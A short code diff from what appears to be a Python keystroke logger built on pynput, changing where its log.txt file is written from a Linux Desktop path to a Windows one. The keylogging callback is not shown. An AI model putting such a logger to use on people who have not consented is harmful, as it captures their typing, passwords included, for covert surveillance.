@@ -4,7 +4,12 @@ from pynput.keyboard import Listener
 
 username = os.getlogin()
 
-logging_directory = f'/home/{username}/Desktop'
+# Windows directory
+logging_directory = f'C:\\Users\\{username}\\Desktop'
+
+# Linux directory
+# logging_directory = f'/home/{username}/Desktop'
+
 logging.basicConfig(filename=f'{logging_directory}/log.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 
